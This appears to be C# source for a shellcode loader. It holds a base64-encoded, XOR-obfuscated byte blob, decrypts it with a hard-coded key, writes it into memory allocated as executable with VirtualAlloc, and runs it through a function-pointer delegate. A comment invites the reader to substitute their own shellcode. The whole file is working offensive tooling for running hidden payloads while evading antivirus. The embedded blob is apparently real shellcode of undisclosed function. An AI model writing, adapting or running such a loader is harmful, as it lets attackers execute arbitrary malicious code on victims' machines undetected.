using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace ShellcodeLoader
{
    class ShellcodeLoader
    {
        static byte[] XOR(byte[] inputBytes, byte[] keyBytes)
        {
            // Create a new byte array to store the encrypted data
            byte[] encryptedBytes = new byte[inputBytes.Length];

            // Apply XOR operation to each byte in inputBytes using corresponding byte in keyBytes
            for (int i = 0; i < inputBytes.Length; i++)
            {
                encryptedBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return encryptedBytes;
        }
        static void Main(string[] args)
        {
            // Replace the following with your shellcode

            // base64 of xored shellcode
            string base64String = "VyVtq83vy0QKmg2LIJ3fIJ/jIJ/7IL/HpHqljfwQB/GO18/DiwwgpswoST+9/Ea9u0all0ajurUM48w++ka2i8w8IIT3SPemIPlkqhveVGEuZMDubPUP3jvs1jXU1umaT5Vk8+nueKtkp4Zk89HueEbrIMw/IonLj5a0ypS1+jIP9JK1IN8EJpCFqkBqGc3vq52HmkaALDI6ED1aCZuHDVhSNjI6l8uToU0US7jqEIr82aKFq54Qfq6Ox67BzrWKqw==\r\n";
            
            // Base64 decode
            byte[] shellcode = Convert.FromBase64String(base64String);

            // Xor Decrypt
            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };
            byte[] decryptedBytes = XOR(shellcode, keyBytes);
            
            // Allocate memory for the shellcode
            IntPtr ptr = VirtualAlloc(IntPtr.Zero, decryptedBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // Copy the shellcode to the allocated memory
            Marshal.Copy(decryptedBytes, 0, ptr, decryptedBytes.Length);

            // Execute the shellcode
            ((Action)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Action)))();

            // Free the allocated memory
            VirtualFree(ptr, decryptedBytes.Length, MEM_RELEASE);
        }

        // Constants for memory allocation
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint MEM_RELEASE = 0x8000;

        // Import the necessary WinAPI functions
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, int dwSize, uint dwFreeType);
    }
}
